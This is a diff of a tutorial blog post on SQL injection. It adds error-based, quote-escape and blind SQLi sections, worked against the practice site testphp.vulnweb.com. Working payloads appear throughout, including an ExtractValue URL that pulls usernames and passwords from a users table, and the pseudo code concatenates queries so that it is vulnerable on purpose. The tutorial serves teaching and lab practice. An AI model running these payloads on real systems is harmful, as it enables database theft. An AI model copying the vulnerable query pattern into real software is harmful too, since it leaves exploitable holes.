@@ -281,13 +281,13 @@ The question is that, what now ? How we can turn this vulnerability to our favou
 In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not
 possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where `UNION` saves the day.
 <br>
-Instead of passing `1` or `2` or `2-1` into the `?id=` field, we can pass `1 UNION SELECT .......`<br>
+Instead of passing `1` or `2` or `2-1` into the `?id=` field, we can pass `1 UNION SELECT (rest of the query)`<br>
 As you remember that is the code at the back end.
 ```python
 query="SELECT * FROM news WHERE id ="+id
 ``` 
 `www.xyz.com/?id='1 UNION SELECT .....'` <br>
-<br>Query will run this for http request above-> `SELECT * FROM news WHERE id=1 UNION SELECT ....`
+<br>Query will run this for http request above-> `SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query)`
 <br> However at this point of time, we have two problems.<br>
 1-What I will select in my own query ? What will replace the ,I do not know anything about the database.<br>
 2-`UNION` has its limitations, the number of columns that return for each query should match.<br>
@@ -301,11 +301,15 @@ As we talked it about before, we have a principle that has two parts.
 1-Determine your referance point
 <br>
 2-Find a way to get back to that referance point with unexpected behavior.
+<br>
+
 ### Making sure of SQL injection's existence
 Navigate to <http://testphp.vulnweb.com/listproducts.php?cat=1> <br>This will be our referance point.<br><br>
 Than to <http://testphp.vulnweb.com/listproducts.php?cat=2> <br>As we see different cat id brings different items from table.<br><br>
-Than go for <http://testphp.vulnweb.com/listproducts.php?cat=2-1> <br>We tried an unexpected behavior, and eventually returned to our referance point.
+Than go for <http://testphp.vulnweb.com/listproducts.php?cat=2-1> <br><br>We tried an unexpected behavior, and eventually returned to our referance point.
 <br>Thus, now it is certain that this web site vulnerable to sql injection.
+<br>And this is because there is no **input validation** in the source code that is running on server side
+and anybody can pass whatever value they want in the input field, in this case in the `?id=` field.
 <br>
 ### Guessing the design
 If you observe the url, you can guess there is a table named `listproducts` and a column named `cat`.<br>
@@ -317,6 +321,21 @@ Of course those names are not the same like that
 at the source code, so we still do not know any names from the database.
 And of course it may not work like that, just like I said, it is guessing.
 <br>
+After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.
+```python
+id=request.get('id')
+query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
+result = db.execute(query)
+
+if result.size()>0:
+    for i in result:
+        print(i.title)
+        print(i.img)
+        print(i.description)
+        print(i.author)
+else:
+    pass
+```
 ### Finding the column count
 
 As we talked before, after finding the vulnerability with `2-1`, it is crucial to run our own queries.<br>
@@ -438,7 +457,7 @@ Now lets imply this method to the acuart database.
 <br>
 We now have got all the column names in the 'users' table, 'uname' and 'pass' columns are intresting : )
 <br>
-## Extracting values from columns
+### Extracting values from columns
 After this point, our aim is certain, and simple. We need to get 'uname' and 'pass' fields in users table.
 One simple query to get those values, for example just like this. 
 ```sql
@@ -478,3 +497,164 @@ we made above, is kind of close to the real design.
 Gives the same result as:
 <br>
 <http://testphp.vulnweb.com/listproducts.php?cat=1>
+
+## VULNWEB - ERROR BASED SQLi
+
+As you remember, this is the pseudo code for testphp.vulnweb website.
+
+```python
+id=request.get('id')
+query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
+#Try:
+result = db.execute(query)
+#Except:
+    #pass
+
+if result.size()>0:
+    for i in result:
+        print(i.title)
+        print(i.img)
+        print(i.description)
+        print(i.author)
+else:
+    pass
+```
+I have added those comment lines intentionally.If we had those `Try` and `Except` lines, or any other exception handling method
+with another language that is used in the server side code, we could not have see this error message.
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/15.jpg)
+<br>
+Spesifically speaking for the pseudo code above, when `execute(query)` method returns a result to the `result` variable from database. `if result.size()>0` means that, if we have returned something from query, print it,
+it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, result
+variable would not be declared at all if the query result is not accurate.
+<br>
+This is a **catastrophic mis-coding** for the server, because we can use this error message to extract data from it.
+<br>
+### Extract value method
+
+As in the example, database return the unexpected string in error message. That means that, we see what we give in the input
+field.Instead of seeing what we give as a string, it is possible that to return values from database.<br>
+There is a helper function that we can use, which is `ExtractValue()`.
+
+<http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))>
+<br>
+Query will look like this on the server side.
+```python
+SELECT (some unknown column names) FROM listproducts WHERE cat=extractvalue(rand(),concat(1,database()))
+```
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql16.jpg)
+<br>
+This time we have returned a function result as an error message and modified the function as we wanted.
+<br>
+As you can see from the picure, result of the `database()` helper function **acuart** is in the error message.
+### Extract value with subquery
+Instead of passing `database()` function as a second argument for `ExtractValue()` method, creating subquery with `()` will
+allow you to write your own queries.
+<br>
+**I am assuming that you read the previous chapters and got the table names already for this example.**
+<br>
+<http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))>
+<br>
+![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql17.jpg)
+<br>
+
+
+## (1' and 1=1 #) AND (1 ' or 1=1 #)
+
+We have figured out the existence of the SQLi with **2-1**.However this due to the fact that, the code at the backend is
+written in this syntax:
+```python
+query="SELECT * FROM news WHERE id ="+id
+```
+When we make a request to the `www.xyz.com/?id=2-1`, the server side code interpret and runs query like this:
+```sql
+SELECT * FROM news WHERE id = 2-1
+--Which returns
++-----+
+| 2-1 |
++-----+
+|   1 |
++-----+
+```
+
+However the code could have  written like this either:
+```python
+id=request.get('id')
+query="SELECT (some unknown column names) FROM listproducts WHERE cat ='" + id + "'"
+#OR
+id=request.get('id')
+query=f"SELECT (some unknown column names) FROM listproducts WHERE cat  ='{id}'"
+```
+When this is the case, if you pass **2-1** to the parameter and make the same `www.xyz.com/?id=2-1` request,
+the query would interpreted like the following, because string formatting is different in this case. As 
+we discussed, both `'1'` and `1` parameters passed to the query will return the same result but `'2-1'` will not.
+```sql
+SELECT * FROM news WHERE id = '2-1'
+--Which returns
++-----+
+| 2-1 |
++-----+
+| 2-1 |
++-----+
+```
+When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operations
+on the database. 
+<br>
+This is where we need to use those `'or 1=1 #` or `'and 1=1 #`.
+
+**Let me remind you the discipline we should follow**
+<br>
+1-Declare a reference point
+<br>
+2-Try to get back there with an unexpected behavior
+<br>
+Lets use `' and 1=1 #` to make the request like this `www.xyz.com/?id=1' and1=1 #`.
+
+```python
+query=f"SELECT * FROM news WHERE id ='{1' and 1=1 #}'"
+```
+```sql
+SELECT - FROM new WHERE id = '1' and 1=1
+```
+This will bring entries which have id of **1**, and means that web application vulnerable to SQLi, from now on you can do everything same as before
+to extract data the database.
+
+## VULNWEB - BLIND SQLi
+
+As you remember this was the pseudo code for testphp.vulnweb.
+```python
+id=request.get('id')
+query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
+result = db.execute(query)
+
+if result.size()>0:
+    for i in result:
+        print(i.title)
+        print(i.img)
+        print(i.description)
+        print(i.author)
+else:
+    pass
+```
+Lets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.
+
+```python
+id=request.get('id')
+query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
+try:
+    result = db.execute(query)
+except:
+    print("Error !!!")
+
+if result.size()>0:
+    #for i in result:
+    #    print(i.title)
+    #    print(i.img)
+    #    print(i.description)
+    #    print(i.author)
+    print("Query succesfull !")
+else:
+    pass
+```
+If this was the case, we could not see any result of the query on the screen, neither
+images nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ?
